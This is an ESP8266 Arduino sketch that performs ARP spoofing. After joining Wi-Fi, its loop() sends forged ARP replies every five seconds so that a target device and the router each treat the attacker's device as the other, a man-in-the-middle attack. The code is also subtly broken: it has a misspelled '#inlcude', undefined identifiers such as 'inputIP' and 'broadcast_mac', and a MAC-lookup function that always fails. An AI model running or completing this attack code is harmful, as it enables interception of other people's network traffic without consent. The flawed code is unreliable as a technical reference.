#include <ESP8266WiFi.h>
#include <lwip/raw.h>
#include <lwip/inet.h>
#include <lwip/etharp.h>
#include <lwip/pbuf.h>

#inlcude "globalVar.h"

// Target and gateway IPs
IPAddress targetIP(input);
IPAddress gatewayIP(routerIP);

// MAC addresses
uint8_t targetMAC[6] = {0};  // Will be filled via ARP request
uint8_t gatewayMAC[6] = {0}; // Will be filled via ARP request
uint8_t myMAC[6];            // Our MAC address

// Raw connection handle
struct raw_pcb *pcb = NULL;

// ARP packet structure
struct etharp_hdr {
  struct eth_hdr ethhdr;
  struct etharp_hdr2 arphdr;
};

// Callback for received raw packets
static u8_t packet_handler(void *arg, struct raw_pcb *pcb, struct pbuf *p, const ip_addr_t *addr) {
  // You could implement packet inspection here
  return 0;
}

// Send ARP packet
void sendARP(uint8_t *src_mac, IPAddress src_ip, uint8_t *dst_mac, IPAddress dst_ip, uint16_t op) {
  struct pbuf *p = pbuf_alloc(PBUF_RAW, sizeof(struct etharp_hdr), PBUF_RAM);
  if (p == NULL) return;
  
  struct etharp_hdr *etharphdr = (struct etharp_hdr *)p->payload;
  
  // Ethernet header
  memcpy(etharphdr->ethhdr.dest.addr, dst_mac, 6);
  memcpy(etharphdr->ethhdr.src.addr, src_mac, 6);
  etharphdr->ethhdr.type = PP_HTONS(ETHTYPE_ARP);
  
  // ARP header
  etharphdr->arphdr.hwtype = PP_HTONS(1); // Ethernet
  etharphdr->arphdr.proto = PP_HTONS(ETHTYPE_IP);
  etharphdr->arphdr.hwlen = 6;
  etharphdr->arphdr.protolen = 4;
  etharphdr->arphdr.opcode = PP_HTONS(op);
  
  memcpy(etharphdr->arphdr.senderhwaddr, src_mac, 6);
  etharphdr->arphdr.senderprotoaddr = src_ip.v4();
  memcpy(etharphdr->arphdr.targethwaddr, dst_mac, 6);
  etharphdr->arphdr.targetprotoaddr = dst_ip.v4();
  
  // Send packet
  raw_send(pcb, p);
  pbuf_free(p);
}

// Get MAC address via ARP request
bool getMAC(IPAddress ip, uint8_t *mac) {
  // Send ARP request
  sendARP(myMAC, WiFi.localIP(), broadcast_mac, ip, ARP_REQUEST);
  
  // Simple way - in reality you'd need to listen for the response
  // This is just a basic example
  delay(1000);
  
  // In a real implementation, you'd capture the ARP reply here
  // For this example, we'll just return false
  return false;
}

void setup() {
  Serial.begin(115200);
  WiFi.begin(ssid, password);
  
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  
  Serial.println("");
  Serial.println("WiFi connected");
  Serial.println("IP address: ");
  Serial.println(WiFi.localIP());
  
  // Get our MAC address
  WiFi.macAddress(myMAC);
  
  // Initialize raw connection
  pcb = raw_new(IP_PROTO_UDP); // Using UDP protocol number as it's common
  raw_bind(pcb, IP_ADDR_ANY);
  raw_recv(pcb, packet_handler, NULL);
  
  // Try to get target and gateway MACs (this won't work as-is - needs proper implementation)
  if (!getMAC(targetIP, targetMAC)) {
    Serial.println("Failed to get target MAC");
  }
  
  if (!getMAC(gatewayIP, gatewayMAC)) {
    Serial.println("Failed to get gateway MAC");
  }
}

void loop() {
  // Send spoofed ARP packets to target (telling it we're the gateway)
  sendARP(myMAC, gatewayIP, targetMAC, inputIP, ARP_REPLY);
  
  // Send spoofed ARP packets to gateway (telling it we're the target)
  sendARP(myMAC, targetIP, gatewayMAC, routerIP, ARP_REPLY);
  
  Serial.println("Sent spoofed ARP packets");
  delay(5000); // Send every 5 seconds
}